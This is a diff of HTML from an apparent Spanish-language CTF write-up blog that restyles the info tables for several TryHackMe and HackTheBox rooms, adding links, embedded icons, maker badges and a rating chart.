+&lt;th align=&#34;left&#34;&gt;&lt;a href=&#34;https://tryhackme.com/room/bruteit&#34;&gt;Brute It&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,AAABAAIAEBAAAAAAIAA1AgAAJgAAABgYAAAAACAAjwIAAFsCAACJUE5HDQoaCgAAAA1JSERSAAAAEAAAABAIAgAAAJCRaDYAAAH8SURBVHicXZK9b1NRDMV/vvcmL3kh5IVKREhABVK3qsAAYxdgYKoEgqkLG0u7sCLEP8BQysDGipiqrsASqSwMQGeIRNulRf3ihX6k79oMCaXkTLbPsSzbR2AREK8AIMIQzP4G0QFh9sbOl/Vye6XqvJn9o09CBI0yObp3tdVzc1Mb0+NdTPpKMUzFolgUU+lXDTCZHu/OTW3I5IU3a7/Dj90Qo0y0evO3NqteSw7gSNmPbub9yPJ62XsbbRTna0Vor6ZgIRhIlujkpb317dJK7oGL9dhqHmRJE0TEOlulzlY5hJKaISBQKFF59jF79TkDHl3beXnnZ6ED1gcTsRAVMyICUije/beudxSKIUcqYCIEg2qwZiXuHPosUYxGoo1KATQSxcgSTZOYJXH7wO1HEVh8OPHr+c1NBxVvQch7br8QoBqsXtbCOIii8PjDyOvl0wFIS9asF2+/1k3k/li3kWiWGGCImS18OyVmD67kacmAAESliPKkfUaEe2NdU8yk/y8RnrabZtwd70Zl0FD2FipaS6IIoaIcuiMVoOSMRGtJNCNUtOwHE2w1D0udNO95Edrf08tZca4WgbVu6KyFvOfNWOqkq3kAE3ELCM5ExQQ0+he3N2au7wLznxqz7846H42BAMMhANo3jdA/9gnn2pDADbl6yN3H6bHgD54G8m/kXhAqAAAAAElFTkSuQmCCiVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAIAAABvFaqvAAACVklEQVR4nK1UPW8TQRB9s7tn+2LHMWAjKFIglAICooqIQDQ0dBR0SBRUiD9AxE9A4QfQpKBAojX8AJooyBFNpBAaI0fCEo4CxLZsC8d3u0Nxex8+2yAgI91pd+bNm9m3d0MkqzgJU6wJAAgk+B/y2RAYANSLO9+F4Fd7hc2m+7dcbOjW4s8Hy31jSD1e6ULx7mFm84s7WWeKJXtnXKuMHl3vwie1te8qyc2eAsXgK5VRIWOm8vRHYu+HE5E2e2q74fqaCKJq69gaAGPrfuvG4tBoSrEIye+buZuvz6fwAAQoZhkXIH24KGf8oAgY1BSKAK/4zaf8eq1EkgGwprXVzr3L/UnpAgY1jcfGWwO53cqFbVBrIKd1bm02ESAJAIcdBds/ETEDjEhAjpzhO97aJ1wQiBJE8xmTUxyFHcFguA6XXR1p5DochMpzOrqfoU99TwAgklXW9Pz20cOrPd+33ZeyRkkeehYUWMExOYd9TZ1j61SKX+7OP3l3miTbjooZU57T0EDQlyc0w3U47+iIyADMyEo+t+ABgE+QKIbfrSUyDBDX25n1DwsA1la6F095xlBMAwAQgj+3nQizVBmZUEGRQOFgIDd2ihs7xYOBFNPuSNAYJpmtUjgItosZNgsjkhuaWEzaLIyIvanIxA/4ewyRrIJxoeSfzev+sR0Ry2e8guK7S4Onqx2tCYCU/KxWelvP932KMVlzOJD7HQUKNCI02k7jyImG1sdvGTBdKo+IooKot53a1xyIE5h4zlmxU0OWBLOGGncqwQBHyFTKmNj/YydG9AtxngShoQkl8wAAAABJRU5ErkJggg==&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
-&lt;td&gt;Info&lt;/td&gt;
-&lt;td&gt;Learn how to brute, hash cracking and escalate privileges in this box!&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Descripción&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Learn how to brute, hash cracking and escalate privileges in this box!&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Puntos&lt;/td&gt;
-&lt;td&gt;730&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;730&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Dificultad&lt;/td&gt;
-&lt;td&gt;Facil&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Facil&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Maker&lt;/td&gt;
-&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/ReddyyZ&#34;&gt;ReddyyZ&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_thm&#34; style=&#34;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://tryhackme.com/p/ReddyyZ&#34;&gt;ReddyyZ&lt;/a&gt; &lt;img src=&#34;https://tryhackme-badges.s3.amazonaws.com/ReddyyZ.png&#34; class=&#34;user_maker_thm&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
@@ -2214,30 +3032,30 @@ kali@kali:~/thm/bruteit$
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/chillhack/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
+&lt;h1 id=&#34;room&#34;&gt;Room&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
-&lt;th&gt;Titulo&lt;/th&gt;
-&lt;th&gt;Chill Hack&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;Titulo&lt;/strong&gt;&lt;/th&gt;
+&lt;th align=&#34;left&#34;&gt;&lt;a href=&#34;https://tryhackme.com/room/chillhack&#34;&gt;Chill Hack&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,AAABAAIAEBAAAAAAIAAKAgAAJgAAABgYAAAAACAALQMAADACAACJUE5HDQoaCgAAAA1JSERSAAAAEAAAABAIAgAAAJCRaDYAAAHRSURBVHicXZI7a5RhEIWfM9+7t8+wSdiAG5uA0UJFtBBvpYVFhFR2FopoIzZaxUaQdP4GESv9A1Y2YhmCWCgiW0QsVBRFJGtcd/O9x2LdBJzqzAxz5sxFQAOOSi1jABAA3gG2JOjBVzsBS4o74h2uSR4XZKsQE4ohmoe3cGscuBmxEiGoQUAxATFxAw7BAwkIYAADyZA7DdqN2uqxWDsfF/a5Xct7UgUZMtpSIAKQFAIory5OPzyVlue1MFXeODjz6Gz9+CxAEJOJEtCqqhIhqqefc8T2Rr/RUvEjDzc2q96mhDOB286YoB4fF9vvyyQTJ2bnuvXDI+du6T8jnZxVtyUT0ha80bhHPRr72zQLgFqcRrcpaCYgFVGOtQJQSP92fhH2Kh7jBlgEyjmrkEwL9e0MC2hJrGYnoB26Z1+HmqhAEEVsmwQjSNIIT8O6ASfgt+nYnfF1AdST1sVl78gRsCbhLGAOzkUIFZByPiItS0P4ID1DdfGrytivpZfa5di1FcnI6Ln0X0qgnU87I01JAVcipu0RSDwxn+wWvLK/2IACMlxT3A+NYADfpG0cKMF3OGDPwAtzKVd9SBkEP+FuzkM0FANTYOESAiowNE0T+vAXzI2sxbat8YAAAAAASUVORK5CYIKJUE5HDQoaCgAAAA1JSERSAAAAGAAAABgIAgAAAG8Vqq8AAAL0SURBVHicrZVPaFxVFMZ/37nvzZtJmpm00TFQLVhDNzYkqXVTEogWxIUuunGnK5ctFqS6dKW4aZW6cSNu7UYEqagbF/6Buim6saKLQkNLC2J10mmSybuni/fm5U06RQoeLrzLfed+9/vOn3vhfzIVnyXZG6Ll+H/5yt0hSg4Gv8BZ94F7CfSuhdfcv8FtuMtB4Eg18GoWEdCBVVjAb7gnxY8G/q3p9TzeR+NBFB14FH6SAgAlUD7O11C6tNdhcPnvsaJbkMvcI2AV1TiMl2WhcaiToKmPng2Xngs/r06eP2KQHeooC6OstI2KfVVMShhBtvJY9uPzk28dHpx8cjtNYpLmpw5Ovfl08/vj2XK3DqQqWZW0BK/OksMXN5LF6fy9K+lkok6q33rZ/Ez/y+vEXQI99ag6kLzMl8PmD7fCpb/08uNhvu39nKYZtvH12sZXa3FzdzDDMHYJJty9ETz3IqutE08k5xb999t2fTs+0wZs+l9e6k58sLB9+nL/wtURShLuAMlsK0xnh8/MzzXTQnbSbmTHuiv7mp92pyaWZ1vLs+kjrbA3y451aad1lAyWQmhItbXGSDqAVfQ5Sd1lDxxAjLHa4inZ22E3FiNHkUr7ZfWVDvrMkq6MKtj7xXH4J4Rqq4OD4ZS9QoSIklrFzKAV9xTfAdp0Pxrj0fs5qyLvQ/y6+S1UtFUJH8aJj7CF/Yq9YrqN3cX6tXEX28JyWYFdMroibtb0Z07DfYA2IJVegHXhhbcAcie6J+gairIJ4g71GTMb8mq6Z+77pPNSGwJEuGh2AQII7kS/E3NBT1rX+Fzu2Jy0KXNUjA9HU/YQ9omFvtRDPbSOrkpHHow1QuqAtGIGODRgsZwXlyUB1tyvuRdNvwUXY+x71WtDa6OPzRZgMKyaQYxeJtyBHL6TvYgfLEuMp6T3vbyTdxi9Y+FVseFeVPRNsa6itD2iKZhx78MERDAIgHPC4x/uI9LmpD1DvVXxqXoEhoGoV6TBn+49AO4BjhIMUTC4QwEAAAAASUVORK5CYII=&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
-&lt;td&gt;Info&lt;/td&gt;
-&lt;td&gt;This room provides the real world pentesting challenges.&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Descripción&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;This room provides the real world pentesting challenges.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Puntos&lt;/td&gt;
-&lt;td&gt;60&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;60&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Dificultad&lt;/td&gt;
-&lt;td&gt;Facil&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Facil&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Maker&lt;/td&gt;
-&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/Anurodh&#34;&gt;Anurodh&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_thm&#34; style=&#34;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://tryhackme.com/p/Anurodh&#34;&gt;Anurodh&lt;/a&gt; &lt;img src=&#34;https://tryhackme-badges.s3.amazonaws.com/Anurodh.png&#34; class=&#34;user_maker_thm&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
@@ -3159,29 +3977,62 @@ root@d88bfe712182:~#
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;Nombre&lt;/th&gt;
-&lt;th&gt;Blunder&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/254&#34;&gt;Blunder&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
-&lt;td&gt;OS&lt;/td&gt;
-&lt;td&gt;Linux&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Linux&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Puntos&lt;/td&gt;
-&lt;td&gt;20&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Dificultad&lt;/td&gt;
-&lt;td&gt;Facil&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;IP&lt;/td&gt;
-&lt;td&gt;10.10.10.191&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;10.10.10.191&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Maker&lt;/td&gt;
-&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/94858&#34;&gt;egotisticalSW&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/94858&#34;&gt;egotisticalSW&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/94858&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;
+&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
+  &lt;span class=&#34;button__text&#34;&gt;
+    Matrix
+  &lt;/span&gt;
+&lt;/a&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
+   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
+   &amp;quot;data&amp;quot;:{
+      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
+      &amp;quot;datasets&amp;quot;:[
+         {
+            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[6.5, 5.9, 7.3, 2.7, 4.1],
+            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
+            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
+         },
+         { 
+            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
+            &amp;quot;data&amp;quot;:[1, 10, 10, 0, 0],
+            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
+            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
+         }
+      ]
+   },
+    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
+            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
+            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
@@ -4018,30 +4869,30 @@ drwxr-xr-x &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; shaun shaun 4.0K Apr &l
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/yearoftherabbit/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
+&lt;h1 id=&#34;room&#34;&gt;Room&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
-&lt;th&gt;Titulo&lt;/th&gt;
-&lt;th&gt;Year of the Rabbit&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;Titulo&lt;/strong&gt;&lt;/th&gt;
+&lt;th align=&#34;left&#34;&gt;&lt;a href=&#34;https://tryhackme.com/room/yearoftherabbit&#34;&gt;Year of the Rabbit&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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